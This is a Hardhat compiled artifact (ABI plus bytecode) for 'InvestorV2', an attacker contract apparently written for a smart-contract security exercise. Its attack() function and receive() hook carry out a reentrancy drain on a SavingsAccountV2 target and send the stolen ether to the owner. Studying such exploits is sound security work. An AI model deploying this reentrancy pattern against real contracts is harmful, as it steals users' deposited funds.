{
  "_format": "hh-sol-artifact-1",
  "contractName": "InvestorV2",
  "sourceName": "contracts/SavingsAccountV2Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "savingsAccountV2ContractAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "savingsAccountV2",
      "outputs": [
        {
          "internalType": "contract ISavingsAccountV2",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b506040516109d93803806109d9833981810160405281019061003291906101b7565b61004e61004361008860201b60201c565b61009060201b60201c565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506101e4565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061018482610159565b9050919050565b61019481610179565b811461019f57600080fd5b50565b6000815190506101b18161018b565b92915050565b6000602082840312156101cd576101cc610154565b5b60006101db848285016101a2565b91505092915050565b6080516107c061021960003960008181605701528181609501528181610255015281816102d6015261035801526107c06000f3fe60806040526004361061004e5760003560e01c8063715018a61461016e5780638da5cb5b146101855780639e5faafc146101b0578063af561993146101ba578063f2fde38b146101e557610169565b366101695760007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16311115610118577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100fb57600080fd5b505af115801561010f573d6000803e3d6000fd5b50505050610167565b61012061020e565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610165573d6000803e3d6000fd5b505b005b600080fd5b34801561017a57600080fd5b50610183610237565b005b34801561019157600080fd5b5061019a61020e565b6040516101a79190610588565b60405180910390f35b6101b861024b565b005b3480156101c657600080fd5b506101cf610356565b6040516101dc9190610602565b60405180910390f35b3480156101f157600080fd5b5061020c6004803603810190610207919061064e565b61037a565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b61023f6103fd565b610249600061047b565b565b6102536103fd565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102bb57600080fd5b505af11580156102cf573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561033c57600080fd5b505af1158015610350573d6000803e3d6000fd5b50505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b6103826103fd565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036103f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103e8906106fe565b60405180910390fd5b6103fa8161047b565b50565b61040561053f565b73ffffffffffffffffffffffffffffffffffffffff1661042361020e565b73ffffffffffffffffffffffffffffffffffffffff1614610479576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104709061076a565b60405180910390fd5b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061057282610547565b9050919050565b61058281610567565b82525050565b600060208201905061059d6000830184610579565b92915050565b6000819050919050565b60006105c86105c36105be84610547565b6105a3565b610547565b9050919050565b60006105da826105ad565b9050919050565b60006105ec826105cf565b9050919050565b6105fc816105e1565b82525050565b600060208201905061061760008301846105f3565b92915050565b600080fd5b61062b81610567565b811461063657600080fd5b50565b60008135905061064881610622565b92915050565b6000602082840312156106645761066361061d565b5b600061067284828501610639565b91505092915050565b600082825260208201905092915050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b60006106e860268361067b565b91506106f38261068c565b604082019050919050565b60006020820190508181036000830152610717816106db565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b600061075460208361067b565b915061075f8261071e565b602082019050919050565b6000602082019050818103600083015261078381610747565b905091905056fea264697066735822122014896ae4ed19aa4b1e2835bc4980e6acb5af20644f7a1269ad148e87d5dd317264736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}